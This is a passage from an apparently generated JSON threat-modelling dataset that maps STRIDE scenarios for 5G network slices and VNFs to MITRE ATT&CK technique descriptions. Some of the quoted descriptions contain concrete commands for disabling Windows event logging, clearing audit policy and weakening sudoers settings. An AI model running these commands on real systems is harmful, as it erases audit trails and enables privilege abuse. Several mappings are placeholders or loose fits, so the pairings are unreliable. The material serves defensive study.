                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies actions performed on a network function due to lack of proper logging.",
            "Assumptions": [
                {
                    "Assumption": "Logging mechanisms do not capture all user actions.",
                    "Role": "System Architect",
                    "Condition": "In under-resourced or legacy log systems."
                },
                {
                    "Assumption": "Logs are not stored in a tamper-evident way.",
                    "Role": "Security Engineer",
                    "Condition": "Due to missing or inadequate security measures."
                },
                {
                    "Assumption": "No digital signatures on critical actions or transactions.",
                    "Role": "Application Developer",
                    "Condition": "In simplified or rushed development cycles."
                }
            ],
            "Potential Impact": "Incident Response, Data Integrity",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "action denial"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A network administrator denies having made specific configuration changes.",
            "Assumptions": [
                {
                    "Assumption": "Configuration changes are not timestamped or user-tagged.",
                    "Role": "Configuration Manager",
                    "Condition": "Due to simplified change management processes."
                },
                {
                    "Assumption": "There is no audit trail for administrative actions.",
                    "Role": "Compliance Officer",
                    "Condition": "In environments without strict compliance requirements."
                },
                {
                    "Assumption": "Backup and versioning of configurations are not maintained.",
                    "Role": "System Administrator",
                    "Condition": "Due to lack of resources or oversight."
                }
            ],
            "Potential Impact": "Data Integrity, Accountability",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration change",
                "audit trail"
            ],
            "mitre_technique": {
                "name": "Sudo Caching",
                "description": "The <code>sudo</code> command \"allows a system administrator to delegate authority to give certain users (or groups of users) the ability to run some (or all) commands as root or another user while providing an audit trail of the commands and their arguments.\" (Citation: sudo man page 2018) Since sudo was made for the system administrator, it has some useful configuration features such as a <code>timestamp_timeout</code> that is the amount of time in minutes between instances of <code>sudo</code> before it will re-prompt for a password. This is because <code>sudo</code> has the ability to cache credentials for a period of time. Sudo creates (or touches) a file at <code>/var/db/sudo</code> with a timestamp of when sudo was last run to determine this timeout. Additionally, there is a <code>tty_tickets</code> variable that treats each new tty (terminal session) in isolation. This means that, for example, the sudo timeout of one tty will not affect another tty (you will have to type the password again).\n\nAdversaries can abuse poor configurations of this to escalate privileges without needing the user's password. <code>/var/db/sudo</code>'s timestamp can be monitored to see if it falls within the <code>timestamp_timeout</code> range. If it does, then malware can execute sudo commands without needing to supply the user's password. When <code>tty_tickets</code> is disabled, adversaries can do this from any tty for that user. \n\nThe OSX Proton Malware has disabled <code>tty_tickets</code> to potentially make scripting easier by issuing <code>echo \\'Defaults !tty_tickets\\' >> /etc/sudoers</code>  (Citation: cybereason osx proton). In order for this change to be reflected, the Proton malware also must issue <code>killall Terminal</code>. As of macOS Sierra, the sudoers file has <code>tty_tickets</code> enabled by default.",
                "id": "attack-pattern--2169ba87-1146-4fc7-a118-12b72251db7e",
                "technique_id": "T1206"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having accessed sensitive data on the network slices.",
            "Assumptions": [
                {
                    "Assumption": "Access logs are incomplete or missing.",
                    "Role": "Access Control Manager",
                    "Condition": "In poorly managed logging systems."
                },
                {
                    "Assumption": "Sensitive data access is not monitored in real-time.",
                    "Role": "Security Operations Center (SOC) Analyst",
                    "Condition": "Due to inadequate monitoring tools."
                },
                {
                    "Assumption": "No role-based access controls enforced.",
                    "Role": "Identity and Access Management Engineer",
                    "Condition": "In organizations without RBAC implementation."
                }
            ],
            "Potential Impact": "Data Confidentiality, Incident Response",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "sensitive data access",
                "denial of access"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data within a network slice is exposed due to improper access controls.",
            "Assumptions": [
                {
                    "Assumption": "Access control mechanisms are not properly configured.",
                    "Role": "System Administrator",
                    "Condition": "During initial setup or updates."
                },
                {
                    "Assumption": "Users have more privileges than necessary (excessive privileges).",
                    "Role": "Access Control Manager",
                    "Condition": "Due to role misconfigurations or oversights."
                },
                {
                    "Assumption": "No regular audits of access controls.",
                    "Role": "Compliance Officer",
                    "Condition": "In environments with lax compliance regimes."
                }
            ],
            "Potential Impact": "Data Confidentiality",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "access control",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Inter-slice communication reveals sensitive information due to lack of proper isolation.",
            "Assumptions": [
                {
                    "Assumption": "Network slices share common resources without isolation.",
                    "Role": "Network Architect",
                    "Condition": "To optimize resource usage."
                },
                {
                    "Assumption": "Inter-slice traffic is not encrypted.",
                    "Role": "Network Security Engineer",
                    "Condition": "Due to optimization or performance concerns."
                },
                {
                    "Assumption": "Network monitoring does not differentiate between slice traffic.",
                    "Role": "SOC Analyst",
                    "Condition": "In under-resourced monitoring environments."
                }
            ],
            "Potential Impact": "Data Confidentiality",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "network slice",
                "isolation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data intercepted during transmission due to unencrypted external interfaces.",
            "Assumptions": [
                {
                    "Assumption": "External interfaces do not enforce encryption.",
                    "Role": "External Interface Manager",
                    "Condition": "Due to legacy systems or lack of upgrade."
                },
                {
                    "Assumption": "Sensitive data is transmitted in clear text.",
                    "Role": "Application Developer",
                    "Condition": "In scenarios without end-to-end encryption policies."
                },
                {
                    "Assumption": "Network traffic is not monitored for sensitive data.",
                    "Role": "Network Security Engineer",
                    "Condition": "In environments with insufficient monitoring."
                }
            ],
            "Potential Impact": "Data Confidentiality",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "unencrypted transmission",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Network Device Configuration Dump",
                "description": "Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files.(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks) These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis. ",
                "id": "attack-pattern--52759bf1-fe12-4052-ace6-c5b0cf7dd7fd",
                "technique_id": "T1602.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attackers flood network slices with high volume traffic to exhaust resources.",
            "Assumptions": [
                {
                    "Assumption": "Traffic filtering mechanisms are not robust.",
                    "Role": "Network Security Engineer",
                    "Condition": "During normal or peak traffic conditions."
                },
                {
                    "Assumption": "Slices do not have rate-limiting protections.",
                    "Role": "Network Architect",
                    "Condition": "To avoid impact on performance."
                },
                {
                    "Assumption": "System monitoring does not detect abnormal traffic patterns.",
                    "Role": "SOC Analyst",
                    "Condition": "In environments with insufficient monitoring tools."
                }
            ],
            "Potential Impact": "System Availability",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "traffic flooding",
                "resource exhaustion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malicious actors target VNFs with resource-intensive requests, causing them to crash.",
            "Assumptions": [
                {
                    "Assumption": "VNFs are not configured to handle high loads.",
                    "Role": "VNF Developer",
                    "Condition": "In standard operational configurations."
                },
                {
                    "Assumption": "Resource allocation mechanisms are not dynamic.",
                    "Role": "Resource Manager",
                    "Condition": "To simplify resource management."
                },
                {
                    "Assumption": "Incident response systems do not restart crashed VNFs promptly.",
                    "Role": "Incident Response Team",
                    "Condition": "In under-resourced or automated environments."
                }
            ],
            "Potential Impact": "System Availability",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "VNF",
                "resource-intensive requests"
            ],
            "mitre_technique": {
                "name": "Application Exhaustion Flood",
                "description": "Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)",
                "id": "attack-pattern--18cffc21-3260-437e-80e4-4ab8bf2ba5e9",
                "technique_id": "T1499.003"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Attacks on orchestration and management infrastructure disrupt the lifecycle of network slices.",
            "Assumptions": [
                {
                    "Assumption": "Management systems do not have failover mechanisms.",
                    "Role": "Network Operations Manager",
                    "Condition": "Due to cost-saving or design choices."
                },
                {
                    "Assumption": "Orchestration processes are not resistant to interruptions.",
                    "Role": "System Architect",
                    "Condition": "In standard operational scenarios."
                },
                {
                    "Assumption": "Monitoring systems do not detect orchestration anomalies promptly.",
                    "Role": "SOC Analyst",
                    "Condition": "In environments with reactive monitoring."
                }
            ],
            "Potential Impact": "System Availability",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "orchestration",
                "management disruption"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user leverages a vulnerability in the virtualization layer to gain higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Virtualization software contains unpatched vulnerabilities.",
                    "Role": "System Administrator",
                    "Condition": "Due to delayed or incomplete patching."
                },
                {
                    "Assumption": "Access controls within the virtualization layer are weak.",
                    "Role": "Infrastructure Engineer",
                    "Condition": "In standard security configurations."
                },
                {
                    "Assumption": "Users have knowledge of the existing vulnerabilities.",
                    "Role": "Threat Intelligence Analyst",
                    "Condition": "Due to public vulnerability disclosures."
                }
            ],
            "Potential Impact": "Data Integrity, Data Confidentiality",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "virtualization layer",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits flaws in orchestration APIs to gain administrative access.",
            "Assumptions": [
                {
                    "Assumption": "API security is not implemented adequately.",
                    "Role": "API Developer",
                    "Condition": "In rapid development cycles."
                },
                {
                    "Assumption": "Orchestration APIs do not enforce strict access controls.",
                    "Role": "Access Control Manager",
                    "Condition": "In environments with misconfigured APIs."
                },
                {
                    "Assumption": "Monitoring and logging of API usage is insufficient.",
                    "Role": "SOC Analyst",
                    "Condition": "Due to inadequate monitoring solutions."
                }
            ],
            "Potential Impact": "Data Integrity, System Availability",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "orchestration API",
                "administrative access"
            ],
            "mitre_technique": {
                "name": "Cloud API",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
                "id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
                "technique_id": "T1059.009"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider user employs social engineering to escalate privileges within the system.",
            "Assumptions": [
                {
                    "Assumption": "Users are susceptible to social engineering attacks.",
                    "Role": "Human Resources",
                    "Condition": "In environments without regular security training."
                },
                {
                    "Assumption": "Internal controls do not enforce strict privilege verification.",
                    "Role": "Compliance Manager",
                    "Condition": "Due to relaxed internal policies."
                },
                {
                    "Assumption": "Activity logging is not detailed enough to detect privilege escalation attempts.",
                    "Role": "Security Auditor",
                    "Condition": "During routine operations without comprehensive logs."
                }
            ],
            "Potential Impact": "Data Integrity, Data Confidentiality",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "social engineering",
                "insider threat"
            ],
            "mitre_technique": {
                "name": "Spearphishing Attachment",
                "description": "Adversaries may send spearphishing emails with a malicious attachment in an attempt to gain access to victim systems. Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation: Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering techniques, such as posing as a trusted source.\n\nThere are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one. ",
                "id": "attack-pattern--2e34237d-8574-43f6-aace-ae2915de8597",
                "technique_id": "T1566.001"
            }
        }
    ]
},
{
    "case_number": "3",
    "batch_number": "15",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a legitimate Network Function (NF) to inject malicious traffic into the 5G core network.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has compromised a VNF management interface.",
                    "Role": "VNF Admin",
                    "Condition": "If the VNF management interface is accessible without strong authentication."
                },
                {
                    "Assumption": "The network does not perform robust identity verification for NFs.",
                    "Role": "Network Operator",
                    "Condition": "Verification of NF identities is weak or flawed."
                },
                {
                    "Assumption": "Log monitoring is insufficient to detect anomalous NF behavior.",
                    "Role": "Security Operator",
                    "Condition": "Logs are not monitored in real-time."
                }
            ],
            "Potential Impact": "Unauthorized access to network traffic and potential introduction of malicious traffic, compromising integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "identity verification",
                "masquerading"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses phishing to obtain the credentials of a network slice management operator.",
            "Assumptions": [
                {
                    "Assumption": "Operators are targeted with phishing emails.",
                    "Role": "Network Slice Admin",
                    "Condition": "Email phishing protection measures are weak."
                },
                {
                    "Assumption": "The attacker successfully deceives the operator to reveal credentials.",
                    "Role": "User",
                    "Condition": "Operators are not trained to recognize phishing."
                },
                {
                    "Assumption": "The system lacks multi-factor authentication (MFA).",
                    "Role": "Authentication Admin",
                    "Condition": "MFA is not enforced for sensitive accounts."
                }
            ],
            "Potential Impact": "Compromise of network slice management systems, leading to potential data breaches and operational disruption.",
            "MITRE ATT&CK Keywords": [
                "phishing",
                "identity",
                "authentication",
                "network slice"
            ],
            "mitre_technique": {
                "name": "Spearphishing Link",
                "description": "Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Links may also direct users to malicious applications  designed to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s, like OAuth tokens, in order to gain access to protected applications and information.(Citation: Trend Micro Pawn Storm OAuth 2017)",
                "id": "attack-pattern--20138b9d-1aac-4a26-8654-a36b6bbf2bba",
                "technique_id": "T1192"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate service provider via external interfaces to intercept 5G traffic.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the external interface control.",
                    "Role": "External Interface Operator",
                    "Condition": "External interfaces are not secured or monitored."
                },
                {
                    "Assumption": "Network traffic is not encrypted end-to-end.",
                    "Role": "Network Security Admin",
                    "Condition": "Encryption protocols are not fully implemented."
                },
                {
                    "Assumption": "The attacker can impersonate a service provider.",
                    "Role": "Attacker",
                    "Condition": "Service provider identities are not strongly authenticated."
                }
            ],
            "Potential Impact": "Interception and potential alteration of data, leading to breaches in confidentiality and integrity.",
            "MITRE ATT&CK Keywords": [
                "interception",
                "network traffic",
                "external interfaces",
                "service provider"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker gains unauthorized access to orchestrate and manipulate the lifecycle management of VNFs.",
            "Assumptions": [
                {
                    "Assumption": "Lack of robust access controls on NFVO.",
                    "Role": "NFVO Admin",
                    "Condition": "Access controls are not properly configured."
                },
                {
                    "Assumption": "The attacker has prior knowledge of orchestration interfaces.",
                    "Role": "Network Admin",
                    "Condition": "Information about orchestration interfaces is not well protected."
                },
                {
                    "Assumption": "Configuration changes are not logged or monitored.",
                    "Role": "Security Operator",
                    "Condition": "Logging and monitoring are not enforced."
                }
            ],
            "Potential Impact": "Alteration of VNF configurations, impacting system reliability, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "orchestration",
                "configuration",
                "tampering",
                "VNF lifecycle"
            ],
            "mitre_technique": {
                "name": "Container Orchestration Job",
                "description": "Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)",
                "id": "attack-pattern--1126cab1-c700-412f-a510-61f4937bb096",
                "technique_id": "T1053.007"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actor exploits a vulnerability in the virtualization layer to alter VNF operations.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerability exists in the hypervisor or container environment.",
                    "Role": "Security Analyst",
                    "Condition": "Hypervisor or container technology has unpatched vulnerabilities."
                },
                {
                    "Assumption": "Attacker has conventional access to the virtualization environment.",
                    "Role": "Virtualization Admin",
                    "Condition": "Access to the virtualization environment is not restricted."
                },
                {
                    "Assumption": "There is insufficient isolation between VNFs.",
                    "Role": "Network Admin",
                    "Condition": "Isolation measures between VNFs are inadequate."
                }
            ],
            "Potential Impact": "Corruption of VNF data and operations, leading to breaches in data integrity and availability.",
            "MITRE ATT&CK Keywords": [
                "virtualization",
                "vulnerability",
                "tampering",
                "VNF operation"
            ],
